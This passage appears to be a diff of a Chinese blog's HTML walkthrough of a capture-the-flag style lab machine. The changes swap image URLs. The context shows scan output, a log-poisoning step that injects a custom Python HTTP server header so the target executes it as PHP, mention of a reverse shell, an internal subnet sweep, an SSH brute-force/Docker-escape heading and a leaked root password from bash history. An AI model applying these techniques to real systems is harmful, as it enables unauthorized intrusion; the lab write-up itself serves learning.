@@ -15,17 +15,15 @@ document.addEventListener("pjax:success", initScrollReveal);
 <meta property="og:site_name" content="ta0的小站">
 <meta property="og:description" content="难度:meduom kali:192.168.0.106 靶机:192.168.56.101 端口扫描root@kali2 [~] ➜  nmap 192.168.0.101                         [11:39:56] Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-02-06 11:39 CST Nmap scan">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="blob:https://111666.best/b35748ef-b5ef-4a2b-ba2d-ff5b73bd3842">
-<meta property="og:image" content="blob:https://111666.best/bb563882-0d5e-4cc3-ae19-b5337b778c3e">
-<meta property="og:image" content="blob:https://111666.best/9110c602-39eb-42ac-98e3-5cc300866baa">
-<meta property="og:image" content="blob:https://111666.best/d00260b5-fb72-4446-a019-151bcadfbf7f">
-<meta property="og:image" content="blob:https://111666.best/9803ba25-5a65-4df4-99dc-611fe71ee893">
+<meta property="og:image" content="https://i.miji.bid/2025/02/06/81308c16f3550c07e33c141d669c2e98.png">
+<meta property="og:image" content="https://i.miji.bid/2025/02/06/2f3c8a45594daeb5abe0873b4de8119a.png">
+<meta property="og:image" content="https://i.miji.bid/2025/02/06/2ef53f6c32c1e5ac31fc1c295ac59a85.png">
 <meta property="article:published_time" content="2025-02-06T03:36:51.907Z">
-<meta property="article:modified_time" content="2025-02-06T05:51:47.316Z">
+<meta property="article:modified_time" content="2025-02-06T06:01:03.619Z">
 <meta property="article:author" content="ta0">
 <meta property="article:tag" content="rce">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="blob:https://111666.best/b35748ef-b5ef-4a2b-ba2d-ff5b73bd3842"><script>(function() {
+<meta name="twitter:image" content="https://i.miji.bid/2025/02/06/81308c16f3550c07e33c141d669c2e98.png"><script>(function() {
   if (CONFIG.mode !== 'auto') return
   const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
   const setting = localStorage.getItem('darken-mode') || 'auto'
@@ -61,9 +59,9 @@ PORT   STATE SERVICE
 /.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">278</span><span class="token punctuation">]</span>
 /server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">278</span><span class="token punctuation">]</span>
 /Anonymous-Connections <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">330</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.0.101/Anonymous-Connections/<span class="token punctuation">]</span></code></pre>
-<p><img src="blob:https://111666.best/b35748ef-b5ef-4a2b-ba2d-ff5b73bd3842" alt="image" loading="lazy"><br><img src="blob:https://111666.best/bb563882-0d5e-4cc3-ae19-b5337b778c3e" alt="image" loading="lazy"><br>根据结果可以知道是一个nmap的扫描</p>
+<p><img src="https://i.miji.bid/2025/02/06/81308c16f3550c07e33c141d669c2e98.png" alt="81308c16f3550c07e33c141d669c2e98.png" loading="lazy"><br>根据结果可以知道是一个nmap的扫描</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">/victims              <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">338</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.0.101/Anonymous-Connections/victims/<span class="token punctuation">]</span></code></pre>
-<p>再扫一遍目录可以得到日志目录<br><img src="blob:https://111666.best/9110c602-39eb-42ac-98e3-5cc300866baa" alt="image" loading="lazy"><br>那么这时候就有人问了，主播主播，这个日志会不会被php解析啊<br>会的会的,扫描结果随便找个字段尝试修改，于是我尝试修改http表头<code>SimpleHTTPServer 0.6 (Python 3.11.9)</code></p>
+<p>再扫一遍目录可以得到日志目录<br><img src="https://i.miji.bid/2025/02/06/2f3c8a45594daeb5abe0873b4de8119a.png" alt="2f3c8a45594daeb5abe0873b4de8119a.png" loading="lazy"><br>那么这时候就有人问了，主播主播，这个日志会不会被php解析啊<br>会的会的,扫描结果随便找个字段尝试修改，于是我尝试修改http表头<code>SimpleHTTPServer 0.6 (Python 3.11.9)</code></p>
 <pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> http<span class="token punctuation">.</span>server <span class="token keyword">import</span> HTTPServer<span class="token punctuation">,</span> SimpleHTTPRequestHandler
 
 <span class="token keyword">class</span> <span class="token class-name">CustomHandler</span><span class="token punctuation">(</span>SimpleHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -73,7 +71,7 @@ PORT   STATE SERVICE
 httpd <span class="token operator">=</span> HTTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">,</span> CustomHandler<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Serving on port 80..."</span><span class="token punctuation">)</span>
 httpd<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p><img src="blob:https://111666.best/d00260b5-fb72-4446-a019-151bcadfbf7f" alt="image" loading="lazy"><br>再看日志确实解析了，于是反弹shell</p>
+<p><img src="https://i.miji.bid/2025/02/06/2ef53f6c32c1e5ac31fc1c295ac59a85.png" alt="2ef53f6c32c1e5ac31fc1c295ac59a85.png" loading="lazy"><br>再看日志确实解析了，于是反弹shell</p>
 <pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> http<span class="token punctuation">.</span>server <span class="token keyword">import</span> HTTPServer<span class="token punctuation">,</span> SimpleHTTPRequestHandler
 
 <span class="token keyword">class</span> <span class="token class-name">CustomHandler</span><span class="token punctuation">(</span>SimpleHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -103,7 +101,7 @@ hacktivist@debian1:/home/hacktivist$ <span class="token function">sudo</span> <s
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>icmp<span class="token punctuation">&#125;</span> <span class="token number">10.10</span>.10.1      up
 <span class="token punctuation">&#123;</span>icmp<span class="token punctuation">&#125;</span> <span class="token number">10.10</span>.10.10     up
 <span class="token punctuation">&#123;</span>icmp<span class="token punctuation">&#125;</span> <span class="token number">10.10</span>.10.20     up</code></pre>
-<p> 有三个机器，当前是10找个机器，搭个隧道都看一下<br> <img src="blob:https://111666.best/9803ba25-5a65-4df4-99dc-611fe71ee893" alt="image" loading="lazy"><br> 10.10.10.1跟外网一样，同一样再打一遍进入找个机器</p>
+<p> 有三个机器，当前是10找个机器，搭个隧道都看一下<br> 10.10.10.1跟外网一样，同一样再打一遍进入找个机器</p>
 <h2 id="ssh爆破-docker逃逸"><a href="#ssh爆破-docker逃逸" class="headerlink" title="ssh爆破+docker逃逸"></a>ssh爆破+docker逃逸</h2> <pre class="language-bash" data-language="bash"><code class="language-bash"> root@debian1:~<span class="token comment"># cat .bash_history </span>
 <span class="token builtin class-name">echo</span> <span class="token string">'root:$uP3r_$3cUr3_D0ck3r'</span> <span class="token operator">|</span> chpasswd
 <span class="token builtin class-name">cd</span>
